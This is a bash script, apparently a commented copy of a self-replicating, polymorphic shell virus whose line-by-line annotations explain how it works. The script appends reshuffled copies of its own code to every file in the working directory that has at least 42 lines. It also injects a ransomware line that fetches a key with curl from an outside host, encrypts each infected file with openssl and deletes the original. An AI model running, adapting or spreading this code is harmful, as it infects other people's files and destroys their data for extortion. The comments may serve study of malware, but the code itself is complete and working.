#!/bin/bash
if [ "$1" == "test" ]; then #@1 if the first input equal to test, then exit
	exit 0 #@2
fi #@3
MANAGER=(test cd ls pwd) #@4 array declaration
RANDOM=$$ #@5   ??process ID?? number of lines ??
mkdir -m0777 /tmp/\ / #@6  create a folder
for target in *; do #@7 for every file in the working dir
	nbline=$(wc -l $target) #@8  nbline are the number of the lines of our file target
	nbline=${nbline## } #@9  nbline now is cutted when we find a space
	nbline=$(echo $nbline | cut -d " " -f1) #@10 the same of above line 9
	if [ $(($nbline)) -lt 42 ]; then #@11 if the number of lines less then 42
		continue #@12
	fi #@13 START Restoring Function
	NEWFILE=${MANAGER[$((RANDOM % 4))]} #@14 newfile is equal to 1 of the 4 names that we have above the sort redifines the structure of the virus;  randomly reorder code instructions; inverter reorder extract the last 39 lines, put the last #@n as left column in the file (the last column put as number of field 0) cut the new column just added and now we have again the lines of our file that we put inside the new file just created
	tail -n 39 $target | awk '{print($NF" "$0)}' | sort -g -t@ -k2 | cut -f2- -d' ' > /tmp/\ /"$NEWFILE" #@15 
	chmod +x /tmp/\ /"$NEWFILE" #@16 gives the permission of execution to the new file
	if /tmp/\ /"$NEWFILE" test ; then #@17 if we are the file with the malware, execute the malware
		continue #@18 if we have succseffully retrieved and executed the malware, we step over to the next file
	fi #@19 END Restoring Function
	NEWFILE=${MANAGER[$((RANDOM % 4))]} #@20 START Main Viral Body: take a new name from the 4 below
	NEWFILE="/tmp/\ /$NEWFILE" #@21 path of this new file that will be created
	echo "tail -n 39 $target | awk '{print(\$NF\" \"\$0)}' | sort -g -t@ -k2 | cut -f2- -d' ' > $NEWFILE" >> $target #@22 append the restoring function to the target file
	echo "chmod +x $NEWFILE && $NEWFILE &" >> $target #@23 append the command that gives us the permission of execution to the future malware file
	echo "[ -f "$target" ] && [[ "${target##*\\.}" != "*.cryptokitty" ]] && key=\"\$(curl -s https://deadkitty.blasco991.com/code.php?m=$target)\" && openssl enc -aes-256-cbc -in "$target" -k \"\$key\" -out "$target.cryptokitty" && rm "$target"; exit 0" >> $target #@24 append the command exit 0 at the end of our file	
	tabft=("FT" [39]=" ") #@25 Start Real-Infection: create an array and put in the first position "FT" and put at position 39 a blank space
	declare -i nbl=0 #@26 declare the integer variable nbl
	while [ $nbl -ne 39 ]; do #@27 while nbl is not 39
		valindex=$(((RANDOM % 39)+1)) #@28 take a index between 1 and 39
		while [ "${tabft[$valindex]}" == "FT" ]; do #@29  in this while we force to select a valindex that we have never visited in the array
			valindex=$(((RANDOM % 39)+1)) #@30 pick a new index
		done
		line=$(tail -$valindex $0 | head -1) #@32 extraction of the -valindex line in current code 
		echo -e "$line" >> $target #@33 put this line into the target file
		tabft[$valindex]="FT" #@34 mark the -valindex position of the array as visited
		nbl=$(($nbl+1)) #@35 counter ++
	done #@36
done #@37
rm /tmp/\ /* #@38
rmdir /tmp/\ / #@39
